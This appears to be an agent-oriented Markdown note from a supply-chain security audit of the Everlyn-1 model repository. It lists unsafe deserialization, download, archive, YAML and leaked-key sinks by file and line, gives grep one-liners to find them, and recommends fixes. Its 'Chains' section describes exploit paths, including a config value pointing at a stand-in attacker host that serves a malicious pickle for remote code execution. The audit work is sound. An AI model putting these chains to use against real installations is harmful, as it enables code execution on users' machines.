# Umbrella Research Repo Pivot — Everlyn-1 Supply-Chain Pattern (Aug 2026)

When the target-type gate fires (payment invariants absent), pivot to **model supply-chain invariants**. This note captures the concrete Everlyn-1 audit so future agents reuse the fingerprint, clone workaround, and sink list.

## Fingerprint: Everlyn-1

- `GET /repos/Everlyn-Labs/Everlyn-1` → `language:null`, `size:60396`
- `GET /git/trees/1292a9...` → 3× `mode:160000` gitlink: `ANTRP:a920846`, `EfficientARV:e0ab42e`, `Wasserstein-VQ:97c8b19` + `README.md` only
- `GET /contents?ref=main` → `type:file` with `mode:160000` = submodule, not file
- Non-vendored Python ≈ 2666 lines (excluding `transformers/` vendor copy)

## Clone fallback — missing `git-remote-https`

Symptom: `git: 'remote-https' is not a git command` (host built from source without curl backend).

```bash
pip install --quiet dulwich
python3 -c "from dulwich import porcelain; porcelain.clone('https://github.com/ORG/REPO', '/tmp/REPO')"
# If no .git dir appears, walk /tmp/REPO directly — content is usable.
# For submodule remotes use raw.githubusercontent.com + API contents/git/trees instead of cloning.
```

## Supply-chain sink list (this repo: 5 classes)

| Class | Grep | Hits | Invariant |
|---|---|---|---|
| Hardcoded secrets | `sk-[A-Za-z0-9]{20,}\|OPENAI_API_KEY\|<third-party-endpoint>\|<third-party-endpoint>` | `gpt4v_eval.py:90` `<redacted>`, `openai_demo.py:6` `<redacted>` + proxies | `secret ∉ repo` |
| Deserialization → RCE | `pickle\.load\|torch\.load\(.*map_location` | `chair.py:464`, `utils.py:331`, `base_model.py:40,42`, `blip2.py:77,79`, `eva_vit.py:433`, `llava_arch.py:222,390`, `runner_base.py:609,630,632`, `EfficientARV/data.py:298,940,967`, `trainer.py:893,1582`, `Wasserstein-VQ/train:130` — all without `weights_only=True` | `cache_load → code_exec == false` |
| Arbitrary download/SSRF | `download_cached_file\|cache_url\|_urlretrieve\|download_and_extract` | `utils.py:154,167,221,242`, `dist_utils.py:120`, `base_dataset_builder.py:150`, `lpips.py:24`; fallback `https→http` downgrade at `utils.py:207` | `download(url) → url ∈ allowlist` |
| Archive traversal | `extract_archive` | `utils.py:239` wraps `torchvision…extract_archive` (Zip Slip pre-0.15) | `extract → dest ∈ extract_root` |
| Unsafe YAML | `yaml\.load.*FullLoader` | `utils.py:365` `FullLoader` instantiates `!!python/object` | `YAML → SafeLoader` |

## Chains

- **Config → RCE:** YAML `finetuned: http://attacker/evil.pth` → `is_url()==True` → `download_cached_file(check_hash=False)` → `torch.load` pickle RCE.
- **Cache drop → RCE:** attacker writes `chair.pkl`/clip-cache at predictable `--cache` path → `pickle.load` on next `chair.py` run.

## One-liners (exclude vendored `transformers/`)

```bash
grep -rnE 'sk-[A-Za-z0-9]{20,}|OPENAI_API_KEY|<third-party-endpoint>|<third-party-endpoint>' ANTRP EfficientARV Wasserstein-VQ --include='*.py' --exclude-dir=transformers
grep -rnE 'pickle\.load|torch\.load\(.*map_location' ANTRP EfficientARV Wasserstein-VQ --include='*.py' --exclude-dir=transformers
grep -rnE 'download_cached_file|cache_url|_urlretrieve|download_and_extract' ANTRP EfficientARV --include='*.py' --exclude-dir=transformers
```

Fix pointers: `torch.load(..., weights_only=True)`, migrate `pickle` → `safetensors`, enforce `check_hash`/`md5`, `yaml.safe_load`, allowlisted `hf_hub_download`, rotate leaked `sk-` keys.

*Audit Aug 7 2026 — ~890 objects / 59 MiB via `dulwich.porcelain.clone`.*
